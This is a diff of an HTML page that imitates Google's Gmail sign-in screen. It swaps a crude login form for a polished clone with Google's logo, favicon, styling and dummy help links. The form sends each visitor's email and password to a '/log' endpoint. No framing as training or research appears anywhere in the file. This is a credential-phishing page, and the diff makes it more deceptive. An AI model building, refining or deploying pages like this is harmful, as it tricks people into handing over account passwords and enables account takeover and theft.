@@ -1,20 +1,245 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Sign in – Google Accounts</title>
-  <link rel="stylesheet" href="/Gmail/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path fill='%234285F4' d='M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z'/><path fill='%2334A853' d='M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z'/><path fill='%23FBBC05' d='M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z'/><path fill='%23EA4335' d='M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z'/></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .google-logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .google-logo svg {
+            width: 75px;
+            height: 24px;
+        }
+
+        .card {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            background: #fff;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 24px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-wrapper {
+            margin-bottom: 24px;
+        }
+
+        label {
+            color: #5f6368;
+            font-size: 12px;
+            font-weight: 500;
+            display: block;
+            margin-bottom: 8px;
+            transition: color 0.2s;
+        }
+
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #202124;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+
+        input:focus + label {
+            color: #1a73e8;
+        }
+
+        .forgot-link {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 26px;
+            display: inline-block;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .button-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 26px;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-btn {
+            background: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 9px 24px;
+            cursor: pointer;
+            transition: background 0.2s, box-shadow 0.2s;
+        }
+
+        .next-btn:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
+        }
+
+        .next-btn:active {
+            background: #1557b0;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 2px 6px 2px rgba(60,64,67,.15);
+        }
+
+        .footer {
+            margin-top: 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer select {
+            border: none;
+            background: transparent;
+            color: #5f6368;
+            font-size: 12px;
+            cursor: pointer;
+            padding: 4px;
+            outline: none;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 600px) {
+            .card {
+                padding: 32px 24px;
+            }
+
+            .footer {
+                flex-direction: column;
+                gap: 20px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="login-box">
-    <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="avatar" class="avatar">
-    <h2>Sign in</h2>
-    <p>to continue to Gmail</p>
-    <form action="/log" method="POST">
-      <input type="text" name="email" placeholder="Email or phone" required><br>
-      <input type="password" name="pass" placeholder="Enter your password" required><br>
-      <button type="submit">Next</button>
-    </form>
-  </div>
+    <div class="container">
+        <div class="google-logo">
+            <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#4285F4" d="M67.954 16.303c-1.378 0-2.54-.62-3.28-1.76l-3.76 1.55c1.3 2.83 4.27 4.82 8.04 4.82 5.2 0 9.27-3.36 9.27-8.76 0-5.4-4.07-8.76-9.27-8.76-3.77 0-6.74 2-8.04 4.82l3.76 1.55c.74-1.14 1.9-1.76 3.28-1.76 2.76 0 4.82 2.07 4.82 4.82s-2.06 4.82-4.82 4.82zm-24.01-7.25h7.14v2.24h-7.14v4.62h8.6v2.24h-11.1V3.2h11.1v2.24h-8.6v3.64z"/>
+                <path fill="#EA4335" d="M18.53 9.68c0 3.86-2.77 6.82-6.68 6.82-3.9 0-6.68-2.96-6.68-6.82 0-3.86 2.77-6.82 6.68-6.82 3.9 0 6.68 2.96 6.68 6.82zM15.4 9.68c0-2.35-1.5-3.92-3.55-3.92-2.05 0-3.55 1.57-3.55 3.92 0 2.35 1.5 3.92 3.55 3.92 2.05 0 3.55-1.57 3.55-3.92z"/>
+                <path fill="#FBBC05" d="M30.22 9.68c0 3.86-2.77 6.82-6.68 6.82-3.9 0-6.68-2.96-6.68-6.82 0-3.86 2.77-6.82 6.68-6.82 3.9 0 6.68 2.96 6.68 6.82zm-3.13 0c0-2.35-1.5-3.92-3.55-3.92-2.05 0-3.55 1.57-3.55 3.92 0 2.35 1.5 3.92 3.55 3.92 2.05 0 3.55-1.57 3.55-3.92z"/>
+                <path fill="#4285F4" d="M41.6 3.2v12.8h-3.02V3.2H41.6zm4.3 0v12.8h3.14c1.88 0 3.32-.58 4.3-1.56.97-.97 1.46-2.3 1.46-3.96 0-1.67-.49-3-1.46-3.96-.98-.98-2.42-1.56-4.3-1.56h-3.14zm3.13 2.24h.02c.97 0 1.73.28 2.27.84.54.56.8 1.35.8 2.36 0 1-.26 1.8-.8 2.36-.54.56-1.3.84-2.27.84h-.02V5.44z"/>
+                <path fill="#34A853" d="M32.57 3.2h3.02v12.8h-3.02z"/>
+            </svg>
+        </div>
+
+        <div class="card">
+            <h1>Sign in</h1>
+            <p class="subtitle">to continue to Gmail</p>
+
+            <form action="/log" method="POST">
+                <div class="input-wrapper">
+                    <input type="text" name="email" id="email" required autocomplete="username" placeholder="Email or phone">
+                </div>
+
+                <div class="input-wrapper">
+                    <input type="password" name="pass" id="password" required autocomplete="current-password" placeholder="Enter your password">
+                </div>
+
+                <a href="#" class="forgot-link">Forgot email?</a>
+
+                <div class="button-row">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="submit" class="next-btn">Next</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="footer">
+            <select>
+                <option>English (United States)</option>
+            </select>
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
